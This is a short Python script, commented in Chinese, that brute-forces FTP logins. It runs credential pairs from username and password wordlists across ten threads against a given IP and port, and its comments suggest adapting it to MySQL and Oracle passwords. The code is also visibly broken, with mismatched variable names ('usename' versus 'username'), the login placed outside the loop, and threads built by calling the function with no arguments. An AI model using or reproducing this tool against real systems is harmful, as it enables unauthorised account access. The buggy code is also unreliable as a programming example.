import ftplib
import sys
import threading
import queue


# 简单模拟登录测试
# 爆破：IP，端口，用户名，密码字典
# 同时使用了多线程
# 也可以使用这个工具爆破Mysql Oracle密码
# python也有包连接各种数据库
def ftp_brute(ip, port):
    ftp = ftplib.FTP()
    ftp.connect(ip, port)
    while not q.empty():
        dict = q.get()
        dict = dict.split('|')
        username = dict[0]
        passwd = dict[1]
        print(dict)
        # print(username + '|' + passwd)
    try:
        ftp.login(usename, passwd)
        ftp.retrlines('list')
        print(username + '|' + passwd + '|ok')
    except ftplib.all_errors:
        pass


if __name__ == '__main__':
    ip = sys.argv[1]
    port = sys.argv[2]
    userfile = sys.argv[3]
    passfile = sys.argv[4]
    threading_num = 10  # 设置同时跑10个线程
    q = queue.Queue()
    for usename in open(userfile):
        for passwd in open(passfile):
            username = username.replace('\n', '')
            passwd = passwd.replace('\n', '')
            zidian = username + '|' + passwd
            q.put(zidian)
            print(zidian)

    for x in range(int(threading_num)):
        t = threading.Thread(target=ftp_brute(), args=(ip, int(port)))
        t.start()
